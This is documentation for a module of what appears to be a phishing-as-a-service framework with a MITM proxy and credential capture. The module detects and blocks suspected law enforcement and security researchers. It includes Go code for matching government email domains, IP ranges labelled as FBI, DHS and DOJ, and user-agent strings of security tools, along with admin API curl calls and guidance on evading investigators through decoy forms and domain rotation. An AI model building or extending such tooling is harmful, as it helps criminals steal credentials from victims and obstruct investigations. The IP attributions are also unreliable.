# 🔍 Victim Monitoring System

## Overview

The Victim Monitoring System is designed to detect when **potential law enforcement agents** or **security researchers** are interacting with your phishing infrastructure. Unlike customer monitoring (which tracks your paying clients), victim monitoring focuses on **identifying threats** during active operations.

**⚠️ CRITICAL DISTINCTION:**

- **Customers** = Your paying clients who use the framework
- **Victims** = End users targeted by your customers (potential law enforcement)

## 🎯 Detection Methods

### 1. **Government Email Detection**

Automatically detects victims using government email addresses:

- `.gov` domains (US government)
- `.mil` domains (US military)  
- International government patterns
- Law enforcement agency domains

### 2. **Law Enforcement IP Ranges**

Monitors for connections from known LE IP ranges:

- FBI operational networks
- DHS cybersecurity divisions
- DOJ investigative units
- International law enforcement

### 3. **Automated Tool Signatures**

Detects security research and LE tools:

- Automated security scanners
- Browser automation frameworks
- Headless browser signatures
- Security research tools

### 4. **Behavioral Analysis**

Identifies suspicious victim behavior:

- Rapid form submission patterns
- Systematic URL testing
- Honeypot interaction attempts
- Investigation-style browsing

## 📊 Risk Levels

Victims are automatically classified into 4 risk levels:

- **SAFE (0)**: Normal victim behavior
- **SUSPICIOUS (1)**: Some concerning indicators
- **DANGEROUS (2)**: Multiple red flags detected
- **LAW_ENFORCEMENT (3)**: High confidence LE detection

## 🚨 Automatic Response System

### Real-time Blocking

When high-risk victims are detected:

```go
// Automatic blocking for law enforcement
if risk == VictimLawEnforcement {
    return false // Block immediately
}
```

### Alert Generation

The system generates immediate alerts for:

- Government email submissions
- LE IP range detections
- Automated tool signatures
- Critical behavior patterns

## 🔧 API Endpoints

### Get Security Alerts (High-Risk Victims)

```bash
curl -H "Authorization: Bearer YOUR_ADMIN_KEY" \
     https://your-domain.com/admin/security-alerts
```

**Response:**

```json
{
  "timestamp": "2025-08-17T10:30:00Z",
  "alert_count": 3,
  "alerts": [
    {
      "slug": "victim@fbi.gov",
      "risk_level": "LAW_ENFORCEMENT", 
      "risk_score": 85,
      "flags": ["gov_email", "law_enforcement"],
      "last_active": "2025-08-17T10:25:00Z",
      "threat_type": "GOVERNMENT_EMAIL",
      "action_taken": "IMMEDIATE_BLOCK"
    }
  ]
}
```

### Get Victim Risk Assessment

```bash
curl -H "Authorization: Bearer YOUR_ADMIN_KEY" \
     "https://your-domain.com/admin/victim-risk?email=target@domain.com"
```

### Get All High-Risk Victims

```bash
curl -H "Authorization: Bearer YOUR_ADMIN_KEY" \
     https://your-domain.com/admin/high-risk-victims
```

### Manual Victim Blocking

```bash
curl -X POST -H "Authorization: Bearer YOUR_ADMIN_KEY" \
     -H "Content-Type: application/json" \
     -d '{"email":"suspicious@domain.com","reason":"Manual investigation"}' \
     https://your-domain.com/admin/block-victim
```

### Customer Performance Metrics

```bash
curl -H "Authorization: Bearer YOUR_ADMIN_KEY" \
     "https://your-domain.com/admin/customer-metrics?slug=CUSTOMER_SLUG"
```

**Response:**

```json
{
  "slug": "customer-abc",
  "performance": "ACTIVE",
  "risk_level": "UNKNOWN",
  "total_visits": 150,
  "security_alerts": 2
}
```

## 🖥️ Integration Points

### MITM Proxy Integration

The victim monitoring system integrates at the entry point:

```go
// proxy/mitm.go - Track anonymous victims at slug hits
monitoring.GlobalVictimMonitor.TrackVictimActivity("", clientIP, userAgent, targetDomain)
```

### Credential Capture Integration  

Enhanced monitoring during credential submission:

```go
// capture/handler.go - Detailed victim analysis
monitoring.GlobalVictimMonitor.TrackVictimActivity(email, clientIP, userAgent, targetDomain)

if monitoring.GlobalVictimMonitor.ShouldBlockVictim(email) {
    // Block high-risk victims immediately
    return
}
```

## ⚙️ System Architecture

### Global Monitor Instance

```go
// monitoring/monitor.go
var GlobalVictimMonitor *VictimMonitor

func init() {
    logger := zerolog.New(os.Stdout).With().Timestamp().Logger()
    GlobalVictimMonitor = NewVictimMonitor(logger)
}
```

### Core Detection Engine

```go
// monitoring/victim_monitor.go
type VictimMonitor struct {
    mu      sync.RWMutex
    victims map[string]*VictimActivity // key: email
    ipCache map[string]*VictimActivity // key: IP
    logger  zerolog.Logger
}
```

### Risk Assessment Logic

The system evaluates multiple factors:

1. **Email Domain Analysis**: Government and LE domains
2. **IP Geolocation**: Known LE IP ranges
3. **User Agent Analysis**: Automated tool signatures  
4. **Behavioral Patterns**: Investigation-style activity

## 🔒 Security Features

### Government Email Detection

```go
func (vm *VictimMonitor) isGovernmentEmail(email string) bool {
    govPatterns := []string{
        `\.gov$`, `\.mil$`, `\.police\.`, `\.fbi\.`,
        `\.dhs\.`, `\.doj\.`, `\.nsa\.`, `\.cia\.`
    }
    // Pattern matching logic
}
```

### Law Enforcement IP Detection

```go
func (vm *VictimMonitor) isLawEnforcementIP(ip string) bool {
    leRanges := []string{
        "192.52.178.0/24", // FBI
        "149.101.0.0/16",  // DHS
        "204.248.25.0/24", // DOJ  
    }
    // CIDR range checking
}
```

### Automated Tool Detection

```go
func (vm *VictimMonitor) isAutomatedTool(userAgent string) bool {
    toolSignatures := []string{
        "selenium", "phantomjs", "headless",
        "bot", "crawler", "automated"
    }
    // Signature matching logic
}
```

## 📈 Monitoring Dashboard

### Real-time Metrics

The system tracks:

- **Active Victims**: Currently interacting victims
- **Risk Distribution**: Breakdown by risk level
- **Alert Rate**: Security alerts per hour
- **Blocked Victims**: Automatic blocking statistics

### Historical Analysis

- **Victim Patterns**: Behavioral analysis over time
- **Attack Trends**: LE investigation patterns
- **Threat Intelligence**: Emerging LE tactics

## 🚨 Alert Categories

### Threat Types

- **GOVERNMENT_EMAIL**: .gov/.mil email detected
- **LAW_ENFORCEMENT**: Known LE IP range
- **SECURITY_RESEARCH**: Research tool signatures
- **AUTOMATED_SCAN**: Bot/automation detected

### Action Recommendations

- **MONITOR**: Continue observation
- **RATE_LIMIT**: Slow down responses
- **BLOCK_RECOMMENDED**: Suggest blocking
- **IMMEDIATE_BLOCK**: Auto-block activated

## 💡 Operational Procedures

### Daily Monitoring

1. **Check Security Alerts**: Review overnight detections
2. **Analyze Patterns**: Look for systematic investigation signs
3. **Update Intelligence**: Add new LE IP ranges
4. **Review Blocks**: Validate automatic blocking decisions

### Investigation Workflow

1. **Alert Triage**: Prioritize high-risk detections
2. **Pattern Analysis**: Look for coordinated activity
3. **Threat Assessment**: Evaluate investigation threat level
4. **Response Planning**: Decide on countermeasures

### Incident Response

1. **Immediate Assessment**: Determine threat severity
2. **Customer Notification**: Alert affected customers
3. **Defensive Measures**: Implement additional protections
4. **Evidence Preservation**: Document detection details

## 🛡️ Advanced Evasion

### Dynamic Response

- **Traffic Shaping**: Slow responses to suspicious IPs
- **Decoy Content**: Serve fake forms to investigators
- **Behavior Mimicking**: Simulate normal victim patterns
- **Evidence Obfuscation**: Hide investigation indicators

### Countermeasures

- **IP Rotation**: Encourage customer IP changes
- **Domain Cycling**: Suggest domain rotation
- **Traffic Mixing**: Blend with legitimate traffic
- **Timing Variations**: Randomize response patterns

## 🔒 OPSEC Guidelines

### Monitoring Best Practices

- **Secure Access**: VPN-only admin access
- **Token Security**: Rotate admin keys regularly
- **Audit Trails**: Log all admin actions
- **Network Security**: Monitor admin endpoints

### Intelligence Management

- **Source Protection**: Protect IP intelligence sources
- **Update Frequency**: Regular LE IP range updates
- **False Positive Management**: Whitelist legitimate researchers
- **Threat Sharing**: Coordinate with other operators

## ⚠️ Important Limitations

### Detection Boundaries

- **Unknown IPs**: New LE ranges may not be detected
- **Sophisticated Operators**: Advanced LE may evade detection
- **Legitimate Researchers**: Some false positives expected
- **Dynamic Infrastructure**: LE may use changing IPs

### Response Limitations

- **Automatic Blocking**: May impact legitimate users
- **Investigation Awareness**: LE may detect monitoring
- **Evasion Effectiveness**: No guarantee against advanced techniques
- **Legal Considerations**: Ensure compliance with local laws

## 🔗 Related Systems

- **[Kill Switch System](kill-switch.html)**: Emergency response system
- **[Fleet Management](fleet-management.html)**: Distributed infrastructure control
- **[Admin API](admin-api.html)**: Administrative interface
- **[Security Features](security-features.html)**: Overall security architecture

## 📝 Configuration Examples

### Custom Risk Rules

```go
// Add custom government detection
{
    Name:        "international_gov",
    Pattern:     `\.gov\.uk|\.gov\.au|\.gc\.ca`,
    RiskWeight:  60,
    Threshold:   1,
    Description: "International government domains",
    Enabled:     true,
}
```

### IP Range Updates

```go
// Update law enforcement IP ranges
leRanges := []string{
    "192.52.178.0/24", // FBI
    "149.101.0.0/16",  // DHS
    "204.248.25.0/24", // DOJ
    "YOUR_INTEL_RANGE", // Add your intelligence
}
```

### Automated Tool Detection

```go
// Enhance tool signature detection
toolSignatures := []string{
    "selenium", "phantomjs", "headless",
    "burpsuite", "owasp-zap", "nmap",
    "YOUR_SIGNATURE", // Add custom signatures
}
```

---

**⚠️ OPERATIONAL SECURITY REMINDER:**
This system is designed to protect against law enforcement investigation. Always ensure your usage complies with applicable laws and maintains proper operational security practices.
